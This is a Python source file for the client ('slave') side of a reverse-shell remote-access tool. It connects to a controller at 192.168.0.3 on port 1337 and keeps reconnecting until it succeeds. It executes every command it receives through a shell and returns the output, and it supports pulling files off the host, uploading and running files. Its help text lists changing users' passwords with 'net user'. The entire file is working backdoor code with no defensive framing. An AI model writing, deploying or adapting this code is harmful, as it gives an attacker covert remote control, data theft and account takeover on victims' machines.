import socket, subprocess, os, time
from pathlib import Path

#All those variables, you know
host = "192.168.0.3"
port = 1337
datasize = 65536
connected = False
path = "."
help = '''
    Useful Bash commands: 
        kill     : Let's you shut down the client and the slave
        :help    : Let's you view the help page (guess how you got here, Sherlock)
        cd       : Let's you switch directory
        cat      : Let's you view a files content
        mkdir    : Let's you create a new directory
        touch    : Let's you create a new file
        rm       : Let's you remove a file
        rm -r    : Let's you remove a directory
        cp       : Let's you copy a file to a certain location
        mv       : Let's you move a file to a certain location

    Useful Windows commands:
        kill     : Let's you shut down the client and the slave
        :help    : Let's you view the help page (guess how you got here, Sherlock)
        cd       : Let's you switch directory
        dir      : Let's you view a directorys content
        echo.>   : Let's you create a new file
        del      : Let's you delete a file
        mkdir    : Let's you create a new directory
        rmdir    : Let's you delete a directory
        copy     : Let's you copy a file to a certain location
        move     : Let's you move a file to a certain location
        cat      : Let's you view a file's content
        download : download a file (Sadly, not working yet)
        start    : Let's you start a programm or open a website
        download : Let's you download a file
        upload   : Let's you upload a file
        run      : Let's you execute a file
        net user : List all users
        net user USERNAME NEWPASSWORD : Change the password of a certain user
        
        '''

#Create a socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

#Tries to connect to a network / Waits for a connection
def connect():
    try:
        s.connect((host, port))
    except:
        connect()

#Endless loop until a new connection was found
def reconnect():
    print("[*] Connection lost... reconnecting")
    connected = False
    while not connected:
        try:
            s.connect((host,port))
            connected = True
            print("[*] Re-Connection successful")
        except socket.error:
            time.sleep(2)
            print("[*] Trying to reconnect... ")

#Execute connect function
connect()
print("[*] Connected")

while True:
    #Just some small timer
    time.sleep(0.1)
    std_err = False
    x = False

    #Receive Data
    data = s.recv(datasize)
    #Check if data is not empty, if empty (=> client disconnected, try to reconnect)
    if not data:
        print("[*] Lost Connection")
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        reconnect()
        print("[*] Reconnect succesfully 2.0")

    try:
        ddata = data.decode("utf-8")
    except:
        try:
            ddata = data.decode("cp1252")
        except:
            try:
                ddata = data.decode("ISO-8859-1")
            except:
                x = True
                s.send("An error occured when trying to decode the data.")
    
    if len(data) > 0 and x == False:
        # CD aka. Change Directory
        if ddata[:2] == "cd":
            path = ddata[3:]
            if path == "..":
                os.chdir(path)
                std_err = ""
            else:
                try:
                    os.chdir(str(path))
                    std_err = ""
                except:
                    std_err = "[*] Couldn't find path. \n"

        # KILL aka. Close both, client and slave    
        elif ddata == "kill":
            break

        # HELP aka. show all commands
        elif ddata == ":help":
            std_err = help
                
        # CAT aka. get the content of a file    
        elif ddata[:3] == "cat":
            try:
                contents = Path(ddata[4:]).read_text()
                std_err = contents
            except:
                std_err = "[*] Couldnt open file"
                
        elif ddata[:3] == "run":
            try:
                os.system(ddata[4:])
            except:
                std_err = "There has been an error, when trying to run this file"

        elif ddata[:8] == "download":
            try:
                file = open(os.path.join(".",ddata[9:]), 'rb')
                for line in file:
                    s.send(line)
                    time.sleep(0.005)
                file.close()
                time.sleep(2)
                s.send(str.encode("Done"))
                print("[*] File has been sent")
            except:
                std_err = "There has been an error, when trying to download the file"

        elif ddata[:6] == "upload":
            try:
                with open(os.path.join(".", ddata[7:]), 'wb') as f:
                    print("[*] File opened")
                    while True:
                        print("[*] Recieving data... ")
                        file = s.recv(datasize)
                        if file.decode("utf-8") == "Done":
                            print("[*] Done ")
                            break
                        else:
                            f.write(file)
                f.close()
                print("[*] Succesfully downloaded the file and closed the connection.")
            except:
                std_err = "There has been an error, when trying to upload your file"
                    

        #Send commands    
        proc = subprocess.Popen(ddata, shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
        if std_err:
            stdout = str.encode(std_err) + proc.stdout.read() #+ proc.stderr.read()
        else:
            stdout = proc.stdout.read() #+ proc.stderr.read()
        if stdout == b'':
            s.send(str.encode("[*] Done."))
        s.send(stdout)

#Close Connection aka. this will never happen command
s.close()
